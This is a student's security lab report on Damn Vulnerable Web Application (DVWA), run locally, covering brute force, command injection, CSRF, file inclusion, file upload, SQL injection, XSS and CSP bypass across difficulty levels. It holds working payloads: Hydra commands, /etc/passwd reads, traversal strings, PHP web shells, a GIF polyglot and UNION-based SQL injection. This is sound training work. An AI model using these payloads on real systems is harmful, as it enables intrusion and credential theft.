# DVWA Security Lab Report

## Student Information
* **Name:** Abdullah Shaikh
* **ID:** as09245
* **Assignment:** Application Security Testing

## Environment Setup

### Docker Installation
**Command used to verify the installation:**
```bash
docker --version

Res


# Brute Force

## Low

### Payload
Username: admin  
Password: password

### Result
Login successful.

### Screenshot
![Bruteforce Low](images/bruteforce_low.png)

### Explanation
Low security has no rate limiting or brute force protection.

---

## Medium

### Payload
hydra -l admin -P rockyou.txt -s 8080 127.0.0.1 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie: security=medium; PHPSESSID=SESSIONID:S=Welcome" -t 1 -w 10 -V -f

### Screenshot
![Bruteforce Medium](images/bruteforce_medium.png)

### Explanation
Medium security introduces basic protections but automated tools like Hydra can still brute force credentials.

---

## High

### Payload
hydra -l admin -P rockyou.txt -s 8080 127.0.0.1 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login&user_token=TOKEN:H=Cookie: security=high; PHPSESSID=SESSIONID:F=Username and/or password incorrect" -t 1 -w 10 -V -f

### Screenshot
![Bruteforce High](images/bruteforce_high.png)

### Explanation
High security introduces CSRF tokens which make brute forcing more difficult.

# Command Injection

## Low

### Payload
127.0.0.1; ls

### Screenshot
![Command Injection Low](images/command_low.png)

### Explanation
User input is directly executed in a system command.

---

## Medium

### Payload
127.0.0.1 | cat /etc/passwd

### Screenshot
![Command Injection Medium](images/command_medium.png)

### Explanation
Some characters are filtered but command chaining operators still work.

---

## High

### Payload
127.0.0.1 && cat /etc/passwd

### Screenshot
![Command Injection High](images/command_high.png)

### Explanation
Stronger filtering is applied but certain command chaining methods may still work.

# Cross Site Request Forgery (CSRF)

## Low

### Payload
New Password: hacked  
Confirm Password: hacked

### Screenshot
![CSRF Low](images/csrf_low.png)

### Explanation
Low security does not implement CSRF protection.

---

## Medium

### Payload
curl -v --referer "http://127.0.0.1:8080/vulnerabilities/csrf/" "http://127.0.0.1:8080/vulnerabilities/csrf/?password_new=pwn&password_conf=pwn&Change=Change"

### Screenshot
![CSRF Medium](images/csrf_medium.png)

### Explanation
Medium security checks the referer header but it can be spoofed.

---

## High

### Payload
curl "http://127.0.0.1:8080/vulnerabilities/csrf/?password_new=pwn&password_conf=pwn&Change=Change&user_token=TOKEN"

### Screenshot
![CSRF High](images/csrf_high.png)

### Explanation
High security requires a valid CSRF token.

# File Inclusion

## Low

### Payload
../../../../../../etc/passwd

### Screenshot
![File Inclusion Low](images/file_inclusion_low.png)

### Explanation
Directory traversal allows access to system files.

---

## Medium

### Payload
....//....//....//etc/passwd

### Screenshot
![File Inclusion Medium](images/file_inclusion_medium.png)

### Explanation
Filtering attempts to block traversal but can be bypassed.

---

## High

### Payload
file:///var/www/html/hackable/flags/fi.php

### Screenshot
![File Inclusion High](images/file_inclusion_high.png)

### Explanation
Traversal is blocked but certain file wrappers still work.

# File Upload

## Low

### Payload
<?php echo shell_exec($_GET['cmd']); ?>

### Screenshot
![Upload Low](images/upload_low.png)

### Explanation
No validation is performed on uploaded files.

---

## Medium

### Payload
Upload PHP shell disguised as an image file.

### Screenshot
![Upload Medium](images/upload_medium.png)

### Explanation
MIME type validation can be bypassed.

---

## High

### Payload
GIF89a;
<?php system($_REQUEST["cmd"]); ?>

### Screenshot
![Upload High](images/upload_high.png)

### Explanation
Polyglot files bypass file type validation.

# SQL Injection

## Low

### Payload
1' OR '1'='1

### Screenshot
![SQLi Low](images/sqli_low.png)

### Explanation
User input is directly concatenated into SQL queries.

---

## Medium

### Payload
1 OR 1=1#

### Screenshot
![SQLi Medium](images/sqli_medium.png)

### Explanation
Weak filtering allows injection through POST requests.

---

## High

### Payload
0' UNION SELECT first_name, password FROM users #

### Screenshot
![SQLi High](images/sqli_high.png)

### Explanation
Union based injection can expose database data.

# SQL Injection Blind

## Low

### Payload
1' AND 1=1#

### Screenshot
![SQLi Blind Low](images/sqli_blind_low.png)

---

## Medium

### Payload
1 OR 1=1#

### Screenshot
![SQLi Blind Medium](images/sqli_blind_medium.png)

---

## High

### Payload
1' AND 1=1#

### Screenshot
![SQLi Blind High](images/sqli_blind_high.png)

# Cross Site Scripting (XSS)

## DOM XSS

### Payload
<script>alert(1)</script>

### Screenshot
![XSS DOM](images/xss_dom.png)

### Explanation
JavaScript executes in the browser because input is not sanitized.

---

## Reflected XSS

### Payload
<img src=x onerror=alert(1)>

### Screenshot
![XSS Reflected](images/xss_reflected.png)

### Explanation
User input is reflected directly into the page.

---

## Stored XSS

### Payload
<script>alert(1)</script>

### Screenshot
![XSS Stored](images/xss_stored.png)

### Explanation
Malicious script is stored in the database and executed whenever the page loads.

# Weak Session IDs

### Observation
Session IDs were predictable at low and medium security levels.

### Screenshot
![Session IDs](images/session_ids.png)

### Explanation
Weak session generation can allow attackers to guess valid session IDs.

# CSP Bypass

### Payload
<script nonce="VALID_NONCE">alert(1)</script>

### Screenshot
![CSP](images/csp.png)

### Explanation
If the nonce value is exposed it can be reused to bypass CSP.

# JavaScript Security Bypass

### Payload
Execute hidden JavaScript functions using the browser console.

### Screenshot
![Javascript](images/javascript.png)

### Explanation
Client side security controls can be bypassed by manipulating JavaScript execution.